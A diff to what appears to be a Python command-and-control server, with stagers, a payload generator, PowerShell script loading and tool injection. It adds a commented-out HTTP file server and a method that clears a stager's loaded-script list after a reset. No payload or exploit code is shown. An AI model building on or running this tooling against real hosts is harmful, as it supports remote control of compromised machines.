@@ -9,6 +9,9 @@ import payloadgen
 
 import win32pipe, win32file, pywintypes
 
+import http.server
+import socketserver
+
 #from os.path import isfile, join
 
 import readline
@@ -252,6 +255,19 @@ class mysocket_handler():
                 self.__msg_buf = self.__msg_buf + new_msg
             except socket.timeout: #assmue no connection error
                 return self.__msg_buf
+
+
+
+
+# PORT = 8000
+
+# Handler = http.server.SimpleHTTPRequestHandler
+
+# with socketserver.TCPServer(("", PORT), Handler) as httpd:
+#     print("serving at port", PORT)
+#     httpd.serve_forever()
+
+
 
 
 class myserver():
@@ -840,6 +856,8 @@ class myserver():
     def print_psloadlist(self,myuuid):
         print("List of loaded script: {}".format(self.__mypsloader_list[myuuid]))
 
+    def clean_psloadlist(self,myuuid):
+        self.__mypsloader_list[myuuid] = list()
 
 #to hold some config for payloadgen
 class mypayload():
@@ -1266,6 +1284,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
                     self.__t_myserver.create_command(user_input_stager,"psreset","dummy")
+                    self.__t_myserver.clean_psloadlist(user_input_stager)
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_INJECT:
                     
